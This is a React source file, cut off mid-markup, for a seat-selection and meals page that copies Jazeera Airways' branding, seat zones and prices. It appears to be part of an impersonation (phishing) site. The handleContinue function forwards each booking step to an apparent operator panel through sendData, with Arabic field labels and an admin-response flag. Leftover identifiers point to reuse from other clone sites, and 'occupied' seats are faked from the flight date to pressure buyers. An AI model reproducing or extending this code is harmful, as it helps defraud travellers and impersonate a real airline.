import React, { useState, useEffect, useMemo, useRef } from 'react';
import { useLocation } from 'wouter';
import { sendData } from '../lib/store';
import { useLang } from '../contexts/LanguageContext';

interface SummaryLeg {
  route: string;
  detail: string;
  origin: string;
  destination: string;
}

interface PaxPerson {
  firstName?: string;
  lastName?: string;
  type?: string;
}

interface TripSummary {
  passengerCount: number;
  tripLabel: string;
  firstDate: string;
  flightsConv: number;
  taxesConv: number;
  cfarConv: number;
  baseTotalConv: number;
  curCode: string;
  curDecimals: number;
  curRate: number;
  discountConv?: number;
  baseTotalKWD: number;
  legs?: SummaryLeg[];
  bundleName?: string;
  primaryName?: string;
  originCode?: string;
  destCode?: string;
}

// Seat zones, matching the original Jazeera layout.
type ZoneId = 'quickExit' | 'upFront' | 'extraLegroom' | 'midValue' | 'backValue';
interface Zone {
  id: ZoneId;
  label: string;
  rowsText: string;
  rows: number[];
  color: string;       // seat fill
  swatch: string;      // legend swatch
  priceKWD: number;    // per-seat price in KWD
  bannerLabel: string; // divider banner above the zone
}

const ZONES: Zone[] = [
  { id: 'quickExit', label: 'Quick Exit Seats', rowsText: 'Rows: 1-3', rows: [1, 2, 3], color: '#0a2c6e', swatch: '#0a2c6e', priceKWD: 13, bannerLabel: 'Quick exit seats' },
  { id: 'upFront', label: 'Best Value Up Front', rowsText: 'Rows: 4-11', rows: [4, 5, 6, 7, 8, 9, 10, 11], color: '#3aa0e3', swatch: '#3aa0e3', priceKWD: 5, bannerLabel: 'Best value up front' },
  { id: 'extraLegroom', label: 'Extra Legroom in Middle', rowsText: 'Rows: 12-13', rows: [12, 13], color: '#f5c518', swatch: '#f5c518', priceKWD: 12, bannerLabel: 'Extra legroom in middle' },
  { id: 'midValue', label: 'Best Value in Middle', rowsText: 'Rows: 14-20', rows: [14, 15, 16, 17, 18, 19, 20], color: '#3aa0e3', swatch: '#3aa0e3', priceKWD: 3, bannerLabel: 'Best value in middle' },
  { id: 'backValue', label: 'Back Seats Big Value', rowsText: 'Rows: 21-30', rows: [21, 22, 23, 24, 25, 26, 27, 28, 29, 30], color: '#3aa0e3', swatch: '#3aa0e3', priceKWD: 2, bannerLabel: 'Back seats big value' },
];

// Per-seat pricing in KWD based on zone + position (aisle/window vs middle).
// Confirmed from jazeeraairways.com actual deductions.
const SEAT_PRICES_KWD: Record<ZoneId, { aiw: number; mid: number }> = {
  quickExit: { aiw: 14.400, mid: 13.200 },
  upFront: { aiw: 5.500, mid: 5.000 },
  extraLegroom: { aiw: 12.100, mid: 12.100 },
  midValue: { aiw: 3.300, mid: 3.000 },
  backValue: { aiw: 3.300, mid: 2.000 },
};

// Get seat price in KWD based on seat id (e.g. "25D")
const getSeatPriceKWD = (seatId: string): number => {
  const row = parseInt(seatId.slice(0, -1), 10);
  const col = seatId.slice(-1);
  const zone = zoneForRow(row);
  const isMiddle = col === 'B' || col === 'E';
  return isMiddle ? SEAT_PRICES_KWD[zone.id].mid : SEAT_PRICES_KWD[zone.id].aiw;
};

// Fare-based seat access rules:
// Basic: ALL zones paid
// Comfort: midValue + backValue FREE, rest paid
// Flex: upFront + midValue + backValue FREE, quickExit + extraLegroom paid
// Flex Plus / Business: ALL zones FREE
type FareType = 'basic' | 'comfort' | 'flex' | 'flexplus';

const FREE_ZONES: Record<FareType, ZoneId[]> = {
  basic: [],
  comfort: ['midValue', 'backValue'],
  flex: ['upFront', 'midValue', 'backValue'],
  flexplus: ['quickExit', 'upFront', 'extraLegroom', 'midValue', 'backValue'],
};

const normalizeFare = (bundleName: string): FareType => {
  const lower = bundleName.trim().toLowerCase();
  if (lower === 'flex plus' || lower === 'flexplus' || lower === 'business') return 'flexplus';
  if (lower === 'flex') return 'flex';
  if (lower === 'comfort') return 'comfort';
  return 'basic';
};

const isZoneFree = (fare: FareType, zoneId: ZoneId): boolean => FREE_ZONES[fare].includes(zoneId);

const COLS = ['A', 'B', 'C', 'D', 'E', 'F'];
const MIDDLE_COLS = ['B', 'E'];

const zoneForRow = (row: number): Zone => {
  for (const z of ZONES) if (z.rows.includes(row)) return z;
  return ZONES[ZONES.length - 1];
};

// Passenger initials (e.g. "Ali Hassan" -> "AH").
const getInitials = (name: string): string =>
  (name.trim().split(/\s+/).filter(Boolean).map((w) => w[0]).slice(0, 2).join('') || 'G').toUpperCase();

// All physical seat ids on the map (rows 1-30, cols A-F).
const ALL_SEAT_IDS: string[] = (() => {
  const ids: string[] = [];
  for (const z of ZONES) for (const row of z.rows) for (const c of COLS) ids.push(`${row}${c}`);
  return ids;
})();

// Deterministic string hash -> 32-bit seed.
const hashSeed = (str: string): number => {
  let h = 2166136261;
  for (let i = 0; i < str.length; i++) {
    h ^= str.charCodeAt(i);
    h = Math.imul(h, 16777619);
  }
  return h >>> 0;
};

// Mulberry32 seeded PRNG: same seed -> same sequence.
const mulberry32 = (seed: number) => () => {
  seed |= 0;
  seed = (seed + 0x6d2b79f5) | 0;
  let t = Math.imul(seed ^ (seed >>> 15), 1 | seed);
  t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
  return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
};

// Parse a date string like "Sun, 21 Jun 2026" or "21 Jun 2026" into a Date (local midnight).
const parseFlightDate = (raw?: string): Date | null => {
  if (!raw) return null;
  const m = raw.match(/(\d{1,2})\s+([A-Za-z]{3,})\s+(\d{4})/);
  if (!m) {
    const d = new Date(raw);
    return isNaN(d.getTime()) ? null : d;
  }
  const months: Record<string, number> = { jan: 0, feb: 1, mar: 2, apr: 3, may: 4, jun: 5, jul: 6, aug: 7, sep: 8, oct: 9, nov: 10, dec: 11 };
  const mon = months[m[2].slice(0, 3).toLowerCase()];
  if (mon === undefined) return null;
  return new Date(parseInt(m[3], 10), mon, parseInt(m[1], 10));
};

// Days from today (real-time) to the flight date, 0 = today.
const daysUntil = (flight: Date): number => {
  const today = new Date();
  const a = new Date(today.getFullYear(), today.getMonth(), today.getDate()).getTime();
  const b = new Date(flight.getFullYear(), flight.getMonth(), flight.getDate()).getTime();
  return Math.round((b - a) / 86400000);
};

// Deterministically pick a set of pre-occupied seats based on the flight date.
const computeOccupiedSeats = (dateStr?: string): Set<string> => {
  const result = new Set<string>();
  const fd = parseFlightDate(dateStr);
  if (!fd) return result;
  const diff = daysUntil(fd);
  const totalSeats = ALL_SEAT_IDS.length;
  let count = 0;
  
  if (diff <= 0) count = Math.floor(totalSeats * 0.33);
  else if (diff === 1) count = Math.floor(totalSeats * 0.25);
  else if (diff === 2) count = Math.floor(totalSeats * 0.15);
  else if (diff === 3) count = Math.floor(totalSeats * 0.05);
  else return result;
  
  const rand = mulberry32(hashSeed(dateStr || String(fd.getTime())));
  const pool = [...ALL_SEAT_IDS];
  for (let i = pool.length - 1; i > 0; i--) {
    const j = Math.floor(rand() * (i + 1));
    [pool[i], pool[j]] = [pool[j], pool[i]];
  }
  for (let i = 0; i < Math.min(count, pool.length); i++) result.add(pool[i]);
  return result;
};

const Divider: React.FC = () => (
  <div className="flex-1 h-px bg-[#cdd9e8]" />
);

// Arabic translations for zone labels, row text and banner labels.
const ZONE_AR: Record<string, { label: string; banner: string }> = {
  quickExit: { label: 'مقاعد الخروج السريع', banner: 'مقاعد الخروج السريع' },
  upFront: { label: 'أفضل قيمة في المقدمة', banner: 'أفضل قيمة في المقدمة' },
  extraLegroom: { label: 'مساحة إضافية للأرجل في الوسط', banner: 'مساحة إضافية للأرجل في الوسط' },
  midValue: { label: 'أفضل قيمة في الوسط', banner: 'أفضل قيمة في الوسط' },
  backValue: { label: 'مقاعد خلفية بقيمة كبيرة', banner: 'مقاعد خلفية بقيمة كبيرة' },
};

// ===== Meals Tab Component (matches original jazeeraairways.com) =====
const MEALS_DATA = [
  { id: 1, name: 'Potato Bhaji + Chips + Soda + Water', nameAr: 'بطاطا باجي + رقائق + مشروب غازي + ماء', price: 2.5, category: 'hot', img: '/meals/potato-bhaji.jpg' },
  { id: 2, name: 'Chicken Shawarma + Chips + Soda + Water', nameAr: 'شاورما دجاج + رقائق + مشروب غازي + ماء', price: 2.5, category: 'sandwiches', img: '/meals/chicken-shawarma.jpg' },
  { id: 3, name: 'Halloumi Sandwich + Chips + Soda + Water', nameAr: 'ساندوتش حلومي + رقائق + مشروب غازي + ماء', price: 2.5, category: 'sandwiches', img: '/meals/halloumi.jpg' },
  { id: 4, name: 'Chicken Tikka Wrap + Chips + Soda + Water', nameAr: 'راب تكا دجاج + رقائق + مشروب غازي + ماء', price: 2.5, category: 'wraps', img: '/meals/tikka-wrap.jpg' },
  { id: 5, name: 'Falafel Wrap + Chips + Soda + Water', nameAr: 'راب فلافل + رقائق + مشروب غازي + ماء', price: 2.5, category: 'wraps', img: '/meals/falafel-wrap.jpg' },
  { id: 6, name: 'Biryani Rice + Soda + Water', nameAr: 'أرز برياني + مشروب غازي + ماء', price: 3.0, category: 'hot', img: '/meals/biryani.jpg' },
];

const MEAL_CATEGORIES = [
  { id: 'all', label: 'All', labelAr: 'الكل' },
  { id: 'sandwiches', label: 'Sandwiches', labelAr: 'ساندوتشات' },
  { id: 'hot', label: 'Hot food', labelAr: 'أطعمة ساخنة' },
  { id: 'wraps', label: 'Wraps', labelAr: 'رابات' },
];

const MealsTab = ({ isAr, t, summary }: { isAr: boolean; t: (k: string) => string; summary: { curCode: string; curRate: number; curDecimals: number } }) => {
  const [activeCategory, setActiveCategory] = useState('all');
  const [addedMeals, setAddedMeals] = useState<Record<number, number>>({});

  const filteredMeals = activeCategory === 'all'
    ? MEALS_DATA
    : MEALS_DATA.filter((m) => m.category === activeCategory);

  const addMeal = (id: number) => {
    setAddedMeals((prev) => ({ ...prev, [id]: (prev[id] || 0) + 1 }));
  };

  const removeMeal = (id: number) => {
    setAddedMeals((prev) => {
      const n = (prev[id] || 0) - 1;
      if (n <= 0) { const next = { ...prev }; delete next[id]; return next; }
      return { ...prev, [id]: n };
    });
  };

  const formatPrice = (kwdPrice: number) => {
    const converted = kwdPrice * summary.curRate;
    return `${summary.curCode} ${converted.toLocaleString('en-US', { minimumFractionDigits: summary.curDecimals, maximumFractionDigits: summary.curDecimals })}`;
  };

  return (
    <div>
      {/* Featured meals heading */}
      <h3 className="text-[#0a4c95] font-bold text-lg mb-4">{isAr ? 'وجبات مميزة' : 'Featured meals'}</h3>

      {/* Choose by category */}
      <h4 className="text-[#0a2540] font-bold text-base mb-3">{isAr ? 'اختر حسب الفئة' : 'Choose by category'}</h4>

      {/* Category pills */}
      <div className="flex gap-2 flex-wrap mb-5">
        {MEAL_CATEGORIES.map((cat) => (
          <button
            key={cat.id}
            onClick={() => setActiveCategory(cat.id)}
            className={`px-4 py-2 rounded-full text-sm font-medium border transition-colors ${
              activeCategory === cat.id
                ? 'bg-[#e8f4fd] text-[#0a4c95] border-[#0a4c95]'
                : 'bg-white text-[#5b6b7b] border-[#d7e3f2] hover:bg-[#f3f8ff]'
            }`}
          >
            {isAr ? cat.labelAr : cat.label}
          </button>
        ))}
      </div>

      {/* Meal cards */}
      <div className="space-y-4">
        {filteredMeals.map((meal) => (
          <div key={meal.id} className="bg-white rounded-2xl shadow-sm border border-[#e6eef7] p-4 flex items-start gap-4">
            <div className="flex-1">
              <p className="text-[#0a2540] font-medium text-base leading-snug mb-1">{isAr ? meal.nameAr : meal.name}</p>
              <p className="text-[#0a4c95] font-bold text-base mb-3">{formatPrice(meal.price)}</p>
              {(addedMeals[meal.id] || 0) > 0 ? (
                <div className="flex items-center gap-3">
                  <button
                    onClick={() => removeMeal(meal.id)}
                    className="w-8 h-8 rounded-full border border-[#0a4c95] text-[#0a4c95] flex items-center justify-center font-bold text-lg hover:bg-[#f3f8ff]"
                  >
                    -
                  </button>
                  <span className="text-[#0a2540] font-bold text-base">{addedMeals[meal.id]}</span>
                  <button
                    onClick={() => addMeal(meal.id)}
                    className="w-8 h-8 rounded-full border border-[#0a4c95] text-[#0a4c95] flex items-center justify-center font-bold text-lg hover:bg-[#f3f8ff]"
                  >
                    +
                  </button>
                </div>
              ) : (
                <button
                  onClick={() => addMeal(meal.id)}
                  className="px-5 py-1.5 rounded-full border border-[#5b6b7b] text-[#5b6b7b] text-sm font-medium hover:bg-[#f3f8ff] hover:border-[#0a4c95] hover:text-[#0a4c95]"
                >
                  {isAr ? 'إضافة' : 'Add'}
                </button>
              )}
            </div>
            <img src={meal.img} alt={isAr ? meal.nameAr : meal.name} className="w-24 h-20 rounded-xl object-cover" />
          </div>
        ))}
      </div>
    </div>
  );
};

// ===== Skip Seat Modal (carousel with dots - matches original) =====
const SkipSeatModal = ({ isAr, t, onSelectSeat, onContinueWithout }: { isAr: boolean; t: (k: string) => string; onSelectSeat: () => void; onContinueWithout: () => void }) => {
  const [activeSlide, setActiveSlide] = useState(0);
  const slides = isAr ? [
    { t: 'اختر مكانك', d: 'قد تفوت مقاعد النافذة والممر والمساحة الإضافية.', img: '/seat-skip/choose-spot.jpeg' },
    { t: 'تجنّب المقعد الأوسط', d: 'عند امتلاء المقاعد، غالباً ما تبقى المقاعد الوسطى.', img: '/seat-skip/middle-seat.jpeg' },
    { t: 'اجلسوا معاً', d: 'تخطي اختيار المقاعد قد يفرّق مجموعتك.', img: '/seat-skip/sit-together.jpeg' },
  ] : [
    { t: 'Choose your spot', d: 'Window, aisle, & extra-legroom might be missed.', img: '/seat-skip/choose-spot.jpeg' },
    { t: 'Avoid the middle seat', d: "When seats fill up, middle seats are often what's left.", img: '/seat-skip/middle-seat.jpeg' },
    { t: 'Sit together', d: 'Skipping seat selection may split your group.', img: '/seat-skip/sit-together.jpeg' },
  ];
  const carouselRef = useRef<HTMLDivElement>(null);
  const handleScroll = () => {
    if (!carouselRef.current) return;
    const scrollLeft = carouselRef.current.scrollLeft;
    const width = carouselRef.current.offsetWidth;
    setActiveSlide(Math.round(scrollLeft / (width * 0.8)));
  };
  return (
    <div className="fixed inset-0 z-[99999] flex items-center justify-center bg-[#0a4c95]/80 px-4">
      <div className="bg-white rounded-2xl shadow-2xl w-full max-w-md md:max-w-3xl p-5 md:p-8">
        <p className="text-center text-[#5b6b7b] text-sm mb-1">{isAr ? 'تفضّل تخطي اختيار المقعد؟' : 'Prefer to skip your seat?'}</p>
        <h3 className="text-center text-2xl md:text-4xl font-extrabold text-[#0a4c95] mb-5 md:mb-7">
          {isAr ? 'إليك ما قد تفوته.' : <>Here&rsquo;s what you might miss.</>}
        </h3>

        {/* Desktop: grid */}
        <div className="hidden md:grid grid-cols-3 gap-4 mb-7">
          {slides.map((c) => (
            <div key={c.t} className="rounded-2xl overflow-hidden text-center text-white flex flex-col bg-gradient-to-b from-[#13447e] to-[#06224b]">
              <img src={c.img} alt={c.t} className="w-full aspect-square object-cover" />
              <div className="px-4 py-4">
                <div className="font-bold text-lg mb-1">{c.t}</div>
                <div className="text-sm text-white/80">{c.d}</div>
              </div>
            </div>
          ))}
        </div>

        {/* Mobile: horizontal carousel */}
        <div className="md:hidden mb-4">
          <div
            ref={carouselRef}
            onScroll={handleScroll}
            className="flex gap-3 overflow-x-auto snap-x snap-mandatory scrollbar-hide pb-2"
            style={{ scrollbarWidth: 'none', msOverflowStyle: 'none' }}
          >
            {slides.map((c) => (
              <div key={c.t} className="min-w-[75%] snap-center rounded-2xl overflow-hidden text-center text-white flex flex-col bg-gradient-to-b from-[#13447e] to-[#06224b]">
                <img src={c.img} alt={c.t} className="w-full aspect-[3/2] object-cover" />
                <div className="px-3 py-3">
                  <div className="font-bold text-base mb-0.5">{c.t}</div>
                  <div className="text-xs text-white/80">{c.d}</div>
                </div>
              </div>
            ))}
          </div>
          {/* Dots */}
          <div className="flex justify-center gap-2 mt-3">
            {slides.map((_, i) => (
              <div key={i} className={`w-2.5 h-2.5 rounded-full transition-colors ${i === activeSlide ? 'bg-[#0a4c95]' : 'bg-[#d0d9e3]'}`} />
            ))}
          </div>
        </div>

        <p className="text-center text-[#5b6b7b] text-xs mb-4">
          {isAr ? 'سنؤمّن صعودك على متن الطائرة، لكن تخطي اختيار المقعد قد يعني فقدان بعض المزايا.' : <>We&rsquo;ll still get you onboard, but skipping seat selection may mean losing certain benefits.</>}
        </p>
        <div className="flex flex-col gap-2.5">
          <button
            onClick={onSelectSeat}
            className="w-full bg-[#0a4c95] hover:bg-[#083d7a] text-white rounded-full py-3.5 font-bold text-base"
          >
            {isAr ? 'اختر المقعد الآن' : 'Select seat now'}
          </button>
          <button
            onClick={onContinueWithout}
            className="w-full border-2 border-[#0a4c95] text-[#0a4c95] rounded-full py-3.5 font-bold text-base hover:bg-[#f3f8ff]"
          >
            {isAr ? 'المتابعة بدون مقعد' : 'Continue without seat'}
          </button>
        </div>
      </div>
    </div>
  );
};

const SeatCustomization = () => {
  const [, setLocation] = useLocation();
  const { isAr, dir, t } = useLang();
  const zoneBanner = (z: { id: string; bannerLabel: string }) => (isAr && ZONE_AR[z.id] ? ZONE_AR[z.id].banner : z.bannerLabel);
  const zoneLabel = (z: { id: string; label: string }) => (isAr && ZONE_AR[z.id] ? ZONE_AR[z.id].label : z.label);
  const zoneRowsText = (z: { rows: number[] }) => {
    const first = z.rows[0], last = z.rows[z.rows.length - 1];
    return isAr ? `الصفوف: ${first}-${last}` : `Rows: ${first}-${last}`;
  };
  const [tab, setTab] = useState<'seats' | 'meals'>('seats');
  const [summary, setSummary] = useState<TripSummary | null>(null);
  const [people, setPeople] = useState<PaxPerson[]>([]);
  const [assignments, setAssignments] = useState<Record<number, string>>({});
  const [activePax, setActivePax] = useState(0);
  const [flightsOpen, setFlightsOpen] = useState(true);
  const [pendingSeat, setPendingSeat] = useState<string | null>(null);
  const [tappedSeat, setTappedSeat] = useState<string | null>(null);
  const [showSkipModal, setShowSkipModal] = useState(false);
  const [openZone, setOpenZone] = useState<ZoneId | null>(null);
  const [summaryOpen, setSummaryOpen] = useState(false);
  const [bottomBarVisible, setBottomBarVisible] = useState(true);
  const lastScrollY = useRef(0);
  const zoneRefs = useRef<Record<string, HTMLDivElement | null>>({});

  // Hide bottom bar on scroll down, show on scroll up (mobile only)
  useEffect(() => {
    const handleScroll = () => {
      const currentY = window.scrollY;
      if (currentY > lastScrollY.current + 5) {
        // Scrolling down - hide
        setBottomBarVisible(false);
      } else if (currentY < lastScrollY.current - 5) {
        // Scrolling up - show
        setBottomBarVisible(true);
      }
      lastScrollY.current = currentY;
    };
    window.addEventListener('scroll', handleScroll, { passive: true });
    return () => window.removeEventListener('scroll', handleScroll);
  }, []);

  const handleZoneClick = (id: ZoneId) => {
    setOpenZone((prev) => (prev === id ? null : id));
    const el = zoneRefs.current[id];
    if (el) el.scrollIntoView({ behavior: 'smooth', block: 'center' });
  };

  useEffect(() => {
    const raw = localStorage.getItem('tripSummary');
    if (!raw) {
      setLocation('/passenger-details');
      return;
    }
    let parsed: TripSummary | null = null;
    try {
      parsed = JSON.parse(raw);
      setSummary(parsed);
    } catch {
      setLocation('/passenger-details');
      return;
    }
    try {
      const pd: PaxPerson[] = JSON.parse(localStorage.getItem('passengerData') || '[]');
      if (Array.isArray(pd) && pd.length) {
        setPeople(pd);
      } else if (parsed) {
        const count = parsed.passengerCount || 1;
        const nameParts = (parsed.primaryName || 'Guest').split(/\s+/);
        const first = [{ firstName: nameParts[0] || 'Guest', lastName: nameParts.slice(1).join(' ') }];
        const rest = Array.from({ length: Math.max(0, count - 1) }, () => ({ firstName: 'Guest', lastName: '' }));
        setPeople([...first, ...rest]);
      }
    } catch {
      const count = parsed?.passengerCount || 1;
      setPeople(Array.from({ length: count }, () => ({ firstName: 'Guest', lastName: '' })));
    }
    try {
      const saved = JSON.parse(localStorage.getItem('seatAssignments') || '{}');
      if (saved && typeof saved === 'object') setAssignments(saved);
    } catch { /* ignore */ }
  }, [setLocation]);

  const fmt = (vConv: number, s: TripSummary) => {
    const decimals = s.curDecimals ?? 3;
    const code = s.curCode || 'KWD';
    const val = isNaN(vConv) ? 0 : vConv;
    return `${code} ${val.toLocaleString('en-US', {
      minimumFractionDigits: decimals,
      maximumFractionDigits: decimals,
    })}`;
  };

  const bundleName = summary?.bundleName || 'Basic';
  const fareType = normalizeFare(bundleName);
  const seatsIncluded = fareType === 'flexplus'; // all seats free

  const occupiedSeats = useMemo(() => {
    const detail = summary?.legs && summary.legs[0] ? summary.legs[0].detail : undefined;
    const dateStr = (detail && detail.split('|').map((p) => p.trim()).find((p) => /\d{4}/.test(p))) || summary?.firstDate;
    return computeOccupiedSeats(dateStr);
  }, [summary]);

  const seatToPax = useMemo(() => {
    const m: Record<string, number> = {};
    Object.entries(assignments).forEach(([idx, seat]) => { m[seat] = Number(idx); });
    return m;
  }, [assignments]);

  // Always calculate full seat price for display
  const seatKWD = useMemo(() => {
    return Object.values(assignments).reduce((sum, seat) => {
      return sum + getSeatPriceKWD(seat);
    }, 0);
  }, [assignments]);

  // Actual billable seat cost (respects fare-based free zones)
  const seatBillableKWD = useMemo(() => {
    return Object.values(assignments).reduce((sum, seat) => {
      const row = parseInt(seat.slice(0, -1), 10);
      const zone = zoneForRow(row);
      if (isZoneFree(fareType, zone.id)) return sum;
      return sum + getSeatPriceKWD(seat);
    }, 0);
  }, [assignments, fareType]);

  const seatConv = useMemo(() => {
    if (!summary) return 0;
    const decimals = summary.curDecimals ?? 3;
    const rate = summary.curRate ?? 1;
    const ff = Math.pow(10, decimals);
    return Math.round(seatKWD * rate * ff) / ff;
  }, [summary, seatKWD]);

  if (!summary) {
    return <div className="min-h-screen bg-[#EAF1FB]" />;
  }

  const f = Math.pow(10, summary.curDecimals ?? 3);
  const totalConv = Math.round((summary.baseTotalConv + seatConv) * f) / f;
  const farePortion = Math.round(((summary.flightsConv || 0) + (summary.taxesConv || 0)) * f) / f;
  const discountAmount = summary.discountConv != null
    ? Math.round(summary.discountConv * f) / f
    : Math.round((farePortion / 0.65 - farePortion) * f) / f;
  const totalKWD = Math.round((summary.baseTotalKWD + seatKWD) * 1000) / 1000;
  const bundle = bundleName;

  const paxName = (i: number) => `${people[i]?.firstName || ''} ${people[i]?.lastName || ''}`.trim() || 'Guest';
  const anySeatSelected = Object.keys(assignments).length > 0;

  const assignSeatToActive = (seatId: string) => {
    setAssignments((prev) => {
      const next = { ...prev };
      const owner = Object.entries(next).find(([, s]) => s === seatId);
      if (owner) delete next[Number(owner[0])];
      next[activePax] = seatId;
      const total = people.length || 1;
      for (let step = 1; step <= total; step++) {
        const cand = (activePax + step) % total;
        if (!next[cand]) { setActivePax(cand); break; }
      }
      return next;
    });
  };

  const removeSeat = (paxIdx: number) => {
    setAssignments((prev) => {
      const next = { ...prev };
      delete next[paxIdx];
      return next;
    });
    setActivePax(paxIdx);
  };

  const handleContinue = () => {
    const firstSeat = assignments[0] || Object.values(assignments)[0] || '';
    localStorage.setItem('selectedSeat', firstSeat);
    localStorage.setItem('seatAssignments', JSON.stringify(assignments));
    localStorage.setItem('amouage_order_total', String(totalKWD));

    const updatedSummary = {
      ...summary,
      seating: seatConv,
      total: totalConv,
    };
    localStorage.setItem('tripSummary', JSON.stringify(updatedSummary));
    
    sendData({
      data: {
        "المقاعد المختارة": Object.values(assignments).join('، ') || "لم يتم اختيار مقعد",
        "تكلفة المقاعد": `${seatConv} ${summary.curCode}`,
        "الإجمالي بعد المقاعد": `${totalConv} ${summary.curCode}`,
      },
      current: "اختيار المقاعد",
      nextPage: "الوجبات",
      waitingForAdminResponse: false,
      isCustom: true,
    });

    setLocation('/meals');
  };

  // Get seat price in display currency
  const getSeatPriceConv = (seatId: string): number => {
    const priceKWD = getSeatPriceKWD(seatId);
    const rate = summary.curRate ?? 1;
    const ff = Math.pow(10, summary.curDecimals ?? 3);
    return Math.round(priceKWD * rate * ff) / ff;
  };

  // Check if a specific seat is free based on fare
  const isSeatFree = (seatId: string): boolean => {
    const row = parseInt(seatId.slice(0, -1), 10);
    const zone = zoneForRow(row);
    return isZoneFree(fareType, zone.id);
  };

  // Render one seat row (A B C | row-number | D E F)
  const renderRow = (row: number) => {
    const zone = zoneForRow(row);
    const left = ['A', 'B', 'C'];
    const right = ['D', 'E', 'F'];
    const cell = (c: string) => {
      const id = `${row}${c}`;
      const isOccupied = occupiedSeats.has(id);
      const ownerIdx = seatToPax[id];
      const isAssigned = ownerIdx !== undefined;
      const needsConfirm = zone.id === 'extraLegroom';
      const handleSeatClick = () => {
        if (isOccupied) return;
        if (isAssigned) { removeSeat(ownerIdx); setTappedSeat(null); return; }
        if (needsConfirm) { setPendingSeat(id); return; }
        assignSeatToActive(id);
        setBottomBarVisible(true);
      };
      const priceConv = getSeatPriceConv(id);
      const tooltipText = `${id} - ${summary.curCode} ${priceConv.toLocaleString('en-US', { minimumFractionDigits: summary.curDecimals, maximumFractionDigits: summary.curDecimals })}`;
      if (isOccupied) {
        return (
          <div
            key={id}
            className="w-10 h-10 md:w-11 md:h-11 rounded-lg flex items-center justify-center bg-[#c9cdd2] cursor-not-allowed"
            aria-label={`Seat ${id} occupied`}
            title={`${id} – Occupied`}
          >
            <svg viewBox="0 0 24 24" className="w-4 h-4 text-[#5b6470]" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round"><path d="M6 6l12 12M18 6L6 18" /></svg>
          </div>
        );
      }
      return (
        <div key={id} className="relative group/seat">
          <button
            onClick={handleSeatClick}
            className="w-10 h-10 md:w-11 md:h-11 rounded-lg flex items-center justify-center transition-transform hover:scale-105 font-bold text-xs md:text-sm"
            style={{
              background: isAssigned ? '#5cc46a' : zone.color,
              color: isAssigned ? '#0a3d12' : (zone.id === 'extraLegroom' ? '#0a2c6e' : '#ffffff'),
            }}
            aria-label={`Seat ${id} (${zone.label})`}
          >
            {isAssigned ? getInitials(paxName(ownerIdx)) : ''}
          </button>
          {/* Tooltip - desktop: hover, mobile: stays while assigned */}
          <div className={`absolute z-50 bottom-full left-1/2 -translate-x-1/2 mb-2 px-3 py-1.5 bg-[#1a2a3a] text-white text-xs font-semibold rounded-lg whitespace-nowrap shadow-lg pointer-events-none ${isAssigned ? 'block' : 'hidden md:group-hover/seat:block'}`}>
            {tooltipText}
            <div className="absolute top-full left-1/2 -translate-x-1/2 w-0 h-0 border-l-[5px] border-r-[5px] border-t-[5px] border-l-transparent border-r-transparent border-t-[#1a2a3a]" />
          </div>
        </div>
      );
    };
    return (
      <div key={row} className="flex items-center justify-center gap-1.5 md:gap-2">
        <div className="flex gap-1.5 md:gap-2">{left.map(cell)}</div>
        <div className="w-8 md:w-10 text-center text-sm font-bold text-[#5b6b7b]">{row}</div>
        <div className="flex gap-1.5 md:gap-2">{right.map(cell)}</div>
      </div>
    );
  };

  // Banner between zones (matching original: rounded pill with border)
  const banner = (text: string) => (
    <div className="flex items-center gap-3 my-4">
      <Divider />
      <span className="text-xs md:text-sm text-[#5b6b7b] bg-white border border-[#dbe6f3] rounded-full px-4 py-1.5 whitespace-nowrap">{text}</span>
      <Divider />
    </div>
  );

  return (
    <div className="min-h-screen bg-[#EAF1FB] font-avenir pb-48 lg:pb-10" dir={dir}>
      {/* ===== MOBILE HEADER: Back + Title + Skip (NO logo/currency/menu) ===== */}
      <div className="md:hidden sticky top-0 z-[9999] bg-white shadow-sm">
        <div className="flex items-center justify-between px-4 h-14">
          <button
            onClick={() => setLocation('/passenger-details')}
            className="w-9 h-9 rounded-full border border-[#e0e8f0] flex items-center justify-center text-[#001d3d]"
            aria-label="Back"
          >
            <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d={isAr ? "M9 5l7 7-7 7" : "M15 19l-7-7 7-7"} /></svg>
          </button>
          <h1 className="text-[18px] font-extrabold text-[#11315F]">{t('seat.title')}</h1>
          <button
            onClick={() => setShowSkipModal(true)}
            className="text-[#0a72c0] font-bold text-[16px]"
          >
            {t('common.skip')}
          </button>
        </div>
      </div>

      {/* ===== DESKTOP: Logo ===== */}
      <div className="hidden md:block px-6 pt-5">
        <img
          src="/iraqi_airways/upload/logo-white.jpg"
          alt="Jazeera"
          className="h-[90px] cursor-pointer"
          onClick={() => { window.location.href = '/'; }}
          onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }}
        />
      </div>

      <main className="max-w-6xl mx-auto px-3 md:px-4 mt-2">
        {/* ===== MOBILE: Route pill ===== */}
        <div className="md:hidden flex items-center justify-center gap-3 mt-3 mb-4">
          <div className="bg-white border border-[#d7e3f2] rounded-xl px-5 py-2.5 flex items-center gap-2 shadow-sm text-[#0a2540] font-semibold text-[15px]">
            <span>{summary.originCode || 'KWI'}</span>
            <svg className="w-5 h-5 text-[#0a72c0]" fill="currentColor" viewBox="0 0 24 24"><path d="M21 16v-2l-8-5V3.5A1.5 1.5 0 0011.5 2 1.5 1.5 0 0010 3.5V9l-8 5v2l8-2.5V19l-2 1.5V22l3.5-1 3.5 1v-1.5L13 19v-5.5z" /></svg>
            <span>{summary.destCode || 'ADJ'}</span>
            <svg className="w-4 h-4 text-[#5b6b7b]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" /></svg>
          </div>
          <div className="w-10 h-10 rounded-xl bg-[#0a4c95] flex items-center justify-center text-white font-bold text-sm shadow-sm">J9</div>
        </div>

        {/* ===== DESKTOP: Title row + route pill ===== */}
        <div className="hidden md:flex items-center justify-between mb-4 md:mb-6 gap-3 md:gap-4 flex-wrap">
          <div className="flex items-center gap-3 md:gap-5">
            <button
              onClick={() => setLocation('/passenger-details')}
              className="w-11 h-11 rounded-full bg-white border border-[#b8d4b0] flex items-center justify-center text-[#0a72c0] shadow-sm hover:bg-[#f3f8ff] shrink-0"
              aria-label="Back"
            >
